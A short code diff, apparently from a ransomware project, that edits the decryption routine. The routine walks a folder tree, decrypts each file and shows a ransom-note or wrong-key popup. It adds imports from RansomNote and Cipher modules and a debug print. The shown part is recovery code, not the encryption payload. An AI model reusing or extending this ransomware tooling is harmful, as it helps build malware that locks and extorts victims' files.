@@ -1,4 +1,5 @@
-from RansomNote import RansomNote, wrong_key_popup
+from RansomNote import RansomNote, wrong_key_popup, bye_cha
+from Cipher import Cipher
 import PySimpleGUI as sg
 import os
 import sys
@@ -29,12 +30,13 @@ if __name__ == '__main__':
                         for fn in files:
                             full_path = root + os.sep + fn
                             print(full_path + ' -> [decrypted]')
-                            cipher.symmetric_encrypt_or_decrypt(full_path, cipher.key, opt='decrypt')
+                            cipher.symmetric_encrypt_or_decrypt(full_path, opt='decrypt')
                 break # salimos del bucle infinito
             else:
                 wrong_key_popup()
                 
         except Exception as e:
+            print('Hello handling the exception here')
             print(e)
     
     print('All data was successfully decrypted')
